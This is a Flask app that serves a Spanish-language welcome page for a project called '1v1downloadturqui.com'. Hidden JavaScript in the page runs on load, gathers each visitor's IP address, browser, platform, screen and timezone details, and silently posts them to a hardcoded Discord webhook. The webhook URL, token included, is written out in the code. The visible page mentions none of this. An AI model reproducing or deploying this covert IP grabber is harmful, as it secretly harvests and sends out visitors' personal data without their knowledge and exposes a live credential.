from flask import Flask, render_template_string

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1393210975997399071/pUpv2WqvJWAJBpJ-qfljLnUltl40ZRbaPd78AWBvXaNkCLMeTZ99cym1CCDmGG1F8PAQ"

HTML = '''
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>1v1downloadturqui.com</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { background: #222; color: #fff; font-family: Arial, sans-serif; margin: 0; padding: 0; }
    .container { max-width: 600px; margin: 40px auto; background: #333; border-radius: 12px; box-shadow: 0 0 20px #0008; padding: 30px; }
    h1 { color: #ffcc00; }
    a { color: #ffcc00; text-decoration: none; }
    a:hover { text-decoration: underline; }
  </style>
  <script>
    async function getIP() {
      try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip;
      } catch {
        return "Desconocida";
      }
    }
    async function sendInfo() {
      const info = {
        userAgent: navigator.userAgent,
        language: navigator.language,
        screen: { width: screen.width, height: screen.height },
        window: { width: window.innerWidth, height: window.innerHeight },
        platform: navigator.platform,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookiesEnabled: navigator.cookieEnabled,
        touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0
      };
      info.ip = await getIP();
      const msg = {
        content: "Nueva visita a 1v1downloadturqui.com",
        embeds: [{
          title: "Información del visitante",
          fields: Object.entries(info).map(([k, v]) => ({
            name: k,
            value: typeof v === "object" ? JSON.stringify(v) : String(v)
          }))
        }]
      };
      try {
        await fetch(''' + repr(WEBHOOK_URL) + ''', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(msg)
        });
      } catch (e) {}
    }
    window.onload = sendInfo;
  </script>
</head>
<body>
  <div class="container">
    <h1>Bienvenido a 1v1downloadturqui.com</h1>
    <p>Este es el sitio oficial del proyecto <b>1v1downloadturqui.com</b> de <a href="https://github.com/holias">holias</a>.</p>
    <p>Visita el repositorio en <a href="https://github.com/holias/1v1downloadturqui.com" target="_blank">GitHub</a>.</p>
    <p>¡Gracias por tu visita!</p>
  </div>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML)

if __name__ == '__main__':
    app.run(debug=True, port=5001)
